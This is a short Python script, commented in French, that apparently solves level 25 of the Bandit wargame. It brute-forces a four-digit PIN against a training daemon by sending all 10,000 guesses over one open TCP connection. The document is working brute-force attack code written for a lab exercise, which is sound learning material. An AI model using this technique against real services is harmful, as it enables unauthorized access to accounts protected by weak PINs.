#!/usr/bin/env python3
"""
Bandit level 25 — brute-force d'un code PIN à 4 chiffres (0000-9999)
sur un daemon qui garde la connexion TCP ouverte entre chaque essai.

Le service attend une ligne "MOT_DE_PASSE PIN" et répond "Wrong! ..."
tant que le PIN n'est pas correct, sans fermer la connexion : on peut
donc tester les 10 000 combinaisons dans une seule session, en quelques
secondes, au lieu de rouvrir une connexion par essai.

Usage :
    python3 level25_bruteforce_socket.py --host localhost --port 30002 \
        --password <mot_de_passe_du_niveau_precedent>
"""

import argparse
import socket


def brute_force(host: str, port: int, password: str) -> str | None:
    s = socket.create_connection((host, port))
    f = s.makefile("rw")

    # Lire le message d'accueil du service
    print(f.readline(), end="")

    for i in range(10000):
        pin = f"{i:04d}"
        f.write(f"{password} {pin}\n")
        f.flush()

        response = f.readline()
        if "Wrong" not in response:
            print(f"Trouvé ! Pin = {pin}")
            print(response)
            return pin

    return None


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--host", default="localhost", help="Hôte du service")
    parser.add_argument("--port", type=int, required=True, help="Port du service")
    parser.add_argument(
        "--password", required=True, help="Mot de passe trouvé au niveau précédent"
    )
    args = parser.parse_args()

    brute_force(args.host, args.port, args.password)


if __name__ == "__main__":
    main()
